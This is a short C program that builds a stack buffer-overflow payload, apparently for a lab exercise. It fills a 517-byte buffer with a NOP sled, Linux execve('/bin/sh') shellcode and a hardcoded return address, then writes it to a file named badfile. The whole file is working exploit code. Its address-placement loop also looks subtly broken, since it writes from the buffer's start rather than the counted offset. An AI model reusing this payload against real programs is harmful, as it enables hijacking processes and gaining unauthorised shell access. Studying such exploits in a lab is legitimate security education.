#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


void main( int argc, char **argv )
{
	char buffer[ 517 ];
	FILE *badfile;
	long addr = 0xbffff34c;
	long *ptr = ( long * )buffer;
	int i;
	
	memset( &buffer, 0x90, 517 );
	
	strcpy( buffer + 400, shellcode );

	for( i = 44; i < 64; i+=4 )
		*(ptr++) = addr;

	buffer[ 516 ] = '\0';


	badfile = fopen( "./badfile", "w" );
	fwrite( buffer, 517, 1, badfile );
	fclose( badfile );
}
